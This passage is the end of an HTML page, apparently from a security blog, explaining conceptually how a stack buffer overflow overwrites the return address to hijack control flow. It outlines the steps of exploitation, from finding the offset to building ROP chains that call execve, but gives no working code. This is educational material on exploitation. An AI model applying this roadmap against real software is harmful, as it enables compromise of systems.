+<p>Return address overwrite is not a trick. It's a consequence of one architectural decision: <code>RET</code> is <code>POP RIP</code>, unconditionally. The entire mechanism:</p>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>Overflow past buf
+    → corrupt saved RBP (collateral)
+    → corrupt return address (target)
+        → RET pops your value into RIP
+            → CPU jumps to your address
+                → you control execution</code></pre></div>
+<p>Everything else in exploitation is about:</p>
+<ol><li><strong>Finding</strong> this primitive (what's the vulnerable input?)</li><li><strong>Measuring</strong> it (what's the exact offset?)</li><li><strong>Populating</strong> RIP with a useful address (win, gadget, libc function)</li><li><strong>Setting up</strong> the environment that address expects (registers, stack state, arguments)</li></ol>
+<p>Steps 3 and 4 scale from trivial (jump to <code>win()</code>) to complex (20-gadget ROP chain leaking libc, pivoting stack, calling execve with a constructed argv). The primitive is always the same.</p>
+            </div>
+        </article>
+
+        <footer>
+            <span>&copy; <span class="copyright-year">2026</span> dev null notes</span>
+            <span>
+            <a href="https://github.com/mr-dev-null" style="color:var(--dim);text-decoration:none;margin-right:12px;transition:color .15s" onmouseover="this.style.color='var(--accent)'" onmouseout="this.style.color='var(--dim)'">github</a>
+            <a href="/about.html" style="color:var(--dim);text-decoration:none;transition:color .15s" onmouseover="this.style.color='var(--accent)'" onmouseout="this.style.color='var(--dim)'">about</a></span>
+        </footer>
+
+        <script src="/main.js"></script>
+    </body>
+</html>
